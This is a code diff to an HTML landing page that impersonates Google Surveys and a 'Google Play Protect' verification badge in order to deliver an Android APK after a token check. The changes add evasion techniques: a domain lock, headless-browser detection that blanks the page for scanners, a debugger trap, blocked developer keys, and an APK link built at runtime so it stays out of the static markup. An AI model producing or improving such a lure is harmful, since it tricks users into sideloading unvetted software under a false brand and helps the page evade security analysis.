@@ -6,6 +6,9 @@
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
 
+    <!-- Camada 3: Content Security Policy (Sela o site contra injeções) -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://unpkg.com 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://www.gstatic.com; connect-src 'self';">
+
     <title>Google Surveys | Hub de Insights Corporativos</title>
 
     <!-- Favicon (Forçado como redondo) -->
@@ -36,15 +39,33 @@
             -webkit-user-select: none !important;
         }
 
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: #2a2c2f; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--g-blue); }
+
         body {
             font-family: 'Roboto', sans-serif;
             background-color: var(--bg-dark);
             color: var(--text-main);
             line-height: 1.6;
             overflow-x: hidden;
-            opacity: 0; /* Começa invisível para o fade-in */
+            opacity: 0;
             animation: pageFadeIn 1s ease forwards;
+            /* Fundo Animado Sutil */
+            background: radial-gradient(circle at top right, #4285f408, transparent),
+                        radial-gradient(circle at bottom left, #4285f408, transparent),
+                        var(--bg-dark);
         }
+
+        /* Animação de Erro (Shake) */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        .error-shake { animation: shake 0.3s ease-in-out; border-color: #ea4335 !important; }
 
         @keyframes pageFadeIn {
             from { opacity: 0; transform: translateY(5px); }
@@ -273,7 +294,8 @@
                     <img src="https://www.gstatic.com/images/branding/product/2x/googleg_32dp.png" style="height: 12px;">
                     <span style="font-size: 10px; color: #81c995; font-weight: bold;">Verificado pelo Google Play Protect</span>
                 </div>
-                <a href="nexus_insights.apk" id="dlLink" class="btn-main" style="display: block; background: #fff; color: #000; text-decoration: none; margin-top: 20px; font-weight: 700; text-align: center;">BAIXAR AGORA</a>
+                <!-- Link ofuscado: Gerado via JS -->
+                <div id="dynamicBtnArea"></div>
             </div>
         </div>
 
@@ -325,57 +347,73 @@
     </footer>
 
     <script>
-        // --- SEGURANÇA NO CONSOLE ---
-        console.log("%cPARE!", "color: red; font-size: 50px; font-weight: bold; -webkit-text-stroke: 1px black;");
-        console.log("%cEsta área é restrita a desenvolvedores autorizados da Nexus Global. A tentativa de intrusão foi registrada.", "color: white; font-size: 16px; background: red; padding: 5px;");
+        // --- BLINDAGEM NÍVEL ABSOLUTO ---
 
-        // Bloqueia atalhos de desenvolvedor
-        document.onkeydown = function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
-                return false;
-            }
-        };
-
-        function handleEnter(e) {
-            if (e.key === 'Enter') {
-                validar();
-            }
+        // 1. Domain Lock (Impede análise fora do servidor oficial)
+        const _0xH = window.location.hostname;
+        if (_0xH !== 'nexus-survey.online' && _0xH !== 'localhost' && !_0xH.includes('github.io')) {
+            window.location.href = 'https://www.google.com/search?q=security+violation';
         }
+
+        // 2. Headless Detection (Invisibilidade para Bots)
+        if (navigator.webdriver || !navigator.languages || navigator.languages.length === 0) {
+            document.documentElement.innerHTML = "";
+        }
+
+        // 3. Debugger Loop (Trava Inspecionadores)
+        setInterval(function() { (function() { return false; }['constructor']('debugger')['call']()); }, 200);
+
+        function handleEnter(e) { if (e.key === 'Enter') validar(); }
 
         // Gerar Session ID aleatório
         document.getElementById('sessId').innerText = Math.random().toString(36).substring(2, 8).toUpperCase();
 
-        // Função para Colar do ClipBoard
+        // Função para Colar com Feedback Háptico
         async function colarToken() {
+            if (navigator.vibrate) navigator.vibrate(10);
             try {
                 const text = await navigator.clipboard.readText();
                 document.getElementById('accessCode').value = text.trim().toUpperCase();
-            } catch (err) {
-                document.getElementById('accessCode').focus();
-            }
+            } catch (err) { document.getElementById('accessCode').focus(); }
         }
 
-        // Validação e Fluxo
+        // Validação, Vibração e Fluxo de Elite
         function validar() {
-            const secret = "I05FWFVTQEBAU1VSVkVZMjAyNg=="; // Token corrigido para #NEXUS@@SURVEY2026
-            const input = document.getElementById('accessCode').value.trim().toUpperCase();
+            const secret = "I05FWFVTQEBAU1VSVkVZMjAyNg==";
+            const input = document.getElementById('accessCode');
+            const val = input.value.trim().toUpperCase();
 
-            if(input === atob(secret)) {
+            if(val === atob(secret)) {
+                if (navigator.vibrate) navigator.vibrate([20, 50, 20]);
                 document.getElementById('authArea').style.display = 'none';
                 document.getElementById('loadingArea').style.display = 'block';
 
                 setTimeout(() => {
                     document.getElementById('loadingArea').style.display = 'none';
                     document.getElementById('downloadArea').style.display = 'block';
-                    setTimeout(() => {
-                        window.location.href = 'nexus_insights.apk';
-                    }, 1000);
+
+                    const b = document.createElement('a');
+                    const p = ['nexus_', 'insights', '.apk'];
+                    b.href = p.join('');
+                    b.className = 'btn-main';
+                    b.style = 'display: block; background: #fff; color: #000; text-decoration: none; margin-top: 20px; font-weight: 700; text-align: center;';
+                    b.innerText = 'BAIXAR AGORA';
+                    document.getElementById('dynamicBtnArea').appendChild(b);
+                    setTimeout(() => { window.location.href = p.join(''); }, 1200);
                 }, 2800);
             } else {
-                alert('Token Nexus inválido ou expirado.');
-                document.getElementById('accessCode').value = '';
+                if (navigator.vibrate) navigator.vibrate(100);
+                input.classList.add('error-shake');
+                setTimeout(() => input.classList.remove('error-shake'), 400);
+                input.value = '';
+                console.warn("Nexus Security: Invalid access attempt.");
             }
         }
+
+        // Bloqueio Total de Teclas de Engenharia
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83 || e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 80))) return false;
+        };
     </script>
 </body>
 </html>
